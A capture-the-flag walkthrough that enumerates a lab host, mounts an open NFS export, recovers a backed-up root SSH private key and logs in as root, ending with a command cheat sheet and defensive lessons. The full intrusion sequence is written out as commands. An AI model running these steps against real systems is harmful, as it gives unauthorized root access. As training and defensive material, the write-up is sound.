NFS CTF — Complete Deep Walkthrough

Enumerate the target, identify the exposed NFS share, recover the leaked root SSH private key, authenticate as root, and retrieve the flag.

Target172.31.0.113
ObjectiveEnumerate the target, identify the exposed NFS share, recover the leaked root SSH private key, authenticate as root, and retrieve the flag.
Scope note. This walkthrough documents the authorized CTF target solved in the session. Use the techniques only on systems you own or are explicitly authorized to test.

1. Initial reconnaissance with Nmap

The first step was service discovery. The scan used aggressive detection so that open ports, service versions, scripts, and OS hints could be collected in one pass.

nmap -A 172.31.0.113 --min-rate 8000 -T5

Important findings: TCP/22 exposed OpenSSH, TCP/111 exposed rpcbind, and TCP/2049 exposed NFS. rpcbind also revealed NFS-related RPC programs such as mountd and nfs_acl.

22/tcp   open     ssh       OpenSSH 8.4p1 Debian
111/tcp  open     rpcbind
2049/tcp open     nfs       3-4

Port 22 alone did not provide credentials. The combination of 111 + 2049 was much more interesting because it indicated a remotely reachable Network File System. In a CTF, an NFS export may expose backups, home directories, SSH material, scripts, or writable files.

2. What rpcbind and NFS mean

rpcbind maps RPC program numbers to network ports. NFS historically relies on RPC services, so seeing port 111 can help reveal services such as NFS and mountd.

NFS (Network File System) allows a directory on one Linux/Unix machine to be made available to another machine over the network. The remote directory is called an export. A client can mount that export into its own filesystem and then interact with it according to the server's export and filesystem permissions.

3. Enumerating NFS exports

The next step was asking the target which directories it exported:

showmount -e 172.31.0.113

The server returned:

Export list for 172.31.0.113:
/var/share *

This identified /var/share as an NFS export. The * indicates that the export rule is not restricted to a specific named client/host in this listing. That is a major lead, although normal filesystem and NFS permission behavior still applies.

4. Mounting the remote share

A local mount point was created on Kali:

sudo mkdir -p /mnt/ctf_nfs

Then the remote export was attached to that directory:

sudo mount -t nfs 172.31.0.113:/var/share /mnt/ctf_nfs
PartMeaning
sudoMounting normally requires elevated local privileges.
mountAttaches a filesystem to the local directory tree.
-t nfsSpecifies that the filesystem type is NFS.
172.31.0.113:/var/shareRemote server and exported directory.
/mnt/ctf_nfsLocal directory where the export becomes accessible.

The mount was verified with:

mount | grep 172.31.0.113

It showed that the share was mounted read-write using NFSv4.2. This confirmed that Kali could actually access the export.

5. Inspecting the export

ls -la /mnt/ctf_nfs

The important result was:

-rwxrwxrwx 1 root root 2351 Sep 25 2023 package.tar.gz

The archive was owned by root and had mode 777. In symbolic form, the three rwx groups represent owner, group, and others. However, modification was not needed: the useful information was already exposed inside the archive.

6. Inspecting the tar.gz before extracting

Instead of blindly extracting or executing anything, the archive contents were listed first:

tar -tzvf /mnt/ctf_nfs/package.tar.gz

Options:

  • t = list archive contents
  • z = process gzip compression
  • v = verbose output
  • f = the next argument is the archive filename

The archive contained a backup of root's home directory, including:

root/.ssh/id_ecdsa
root/.ssh/authorized_keys
root/.ssh/id_ecdsa.pub
root/.viminfo
root/.bash_history
root/.bashrc
root/.profile

The critical discovery was root/.ssh/id_ecdsa. This is an SSH private key. A private key is authentication material and should never be exposed in a publicly reachable backup/share.

7. Extracting the backup safely

mkdir -p ~/redteam_ctfs/nfs_extract
cd ~/redteam_ctfs/nfs_extract
tar -xzvf /mnt/ctf_nfs/package.tar.gz

Here x means extract. The private key was then available locally at ~/redteam_ctfs/nfs_extract/root/.ssh/id_ecdsa.

8. Why chmod 600 was required

chmod 600 root/.ssh/id_ecdsa

OpenSSH deliberately rejects private keys whose local permissions are too open. Mode 600 means the owner can read and write the file, while group and others receive no permissions.

6 = 4(read) + 2(write)
0 = no permissions
0 = no permissions

600 => rw-------

This does not change the key cryptographically. It only protects the local copy sufficiently for the SSH client to accept it.

9. Authenticating to SSH as root

Because the archive was explicitly a backup of root's home directory and contained root's SSH key material, the key was tested against the target's SSH service:

ssh -i root/.ssh/id_ecdsa root@172.31.0.113
PartMeaning
sshOpenSSH client
-i root/.ssh/id_ecdsaUse this private identity key
root@Authenticate as the root account
172.31.0.113Target host

Authentication succeeded and the prompt became:

root@ip-172-31-0-113:~#

At this point the compromise was confirmed directly with the root shell. No privilege-escalation exploit was necessary: the exposed backup leaked an authentication secret that already belonged to root.

10. Retrieving the flag

Listing root's home directory showed the challenge flag:

ls -la

-r-------- 1 root root 38 Sep 25 2023 flag.txt

It was read with:

cat /root/flag.txt

When troubleshooting the initial submission, this command was also used:

cat -A /root/flag.txt

With cat -A, a trailing $ is normally a visual marker showing the end of a line; it is not part of the flag. Therefore only the characters through the closing } should be submitted.

Note on the flag. The original document records the flag as read from /root/flag.txt but does not print its value in the extracted text, so no flag value is shown here — nothing has been invented to fill the gap.

12. Root cause — what was actually vulnerable?

The core security failure was sensitive backup exposure through NFS. The NFS share made a package containing root's private SSH authentication material accessible to the CTF client. Once the private key was recovered, the existing SSH service accepted it for the root account.

The important lesson is that the weakness was not simply "NFS exists". NFS can be deployed securely. The dangerous combination here was an accessible export plus a backup containing a high-value secret. Broad export rules and overly permissive file modes increased the exposure.

13. Defensive lessons

A secure environment should restrict NFS exports to required clients/networks, apply appropriate export options and filesystem permissions, avoid storing private SSH keys in shared backups, protect backup repositories as sensitive assets, disable direct root SSH access where appropriate, and rotate any credential or private key immediately if it is exposed.

If a private key like this leaks in a real environment, merely deleting the leaked copy is insufficient. The corresponding authorized key should be removed/revoked and replaced with new key material.

14. Command cheat sheet from this CTF

# Initial service enumeration
nmap -A 172.31.0.113 --min-rate 8000 -T5

# Enumerate NFS exports
showmount -e 172.31.0.113

# Create local mount point
sudo mkdir -p /mnt/ctf_nfs

# Mount the export
sudo mount -t nfs 172.31.0.113:/var/share /mnt/ctf_nfs

# Confirm the mount
mount | grep 172.31.0.113

# List exposed files
ls -la /mnt/ctf_nfs

# Inspect archive without extracting
tar -tzvf /mnt/ctf_nfs/package.tar.gz

# Create working directory and extract
mkdir -p ~/redteam_ctfs/nfs_extract
cd ~/redteam_ctfs/nfs_extract
tar -xzvf /mnt/ctf_nfs/package.tar.gz

# Protect the recovered private key locally
chmod 600 root/.ssh/id_ecdsa

# Authenticate using the recovered key
ssh -i root/.ssh/id_ecdsa root@172.31.0.113

# Enumerate root home and read flag
ls -la
cat /root/flag.txt

# Show otherwise invisible line endings if troubleshooting
cat -A /root/flag.txt

15. Key takeaway

The transferable methodology is: enumerate services → investigate unusual/exposed services → inspect accessible data carefully → identify credentials or secrets → understand what identity the secret belongs to → test the legitimate authentication service → verify obtained privileges. In this challenge, careful NFS enumeration was more important than trying to attack SSH directly.
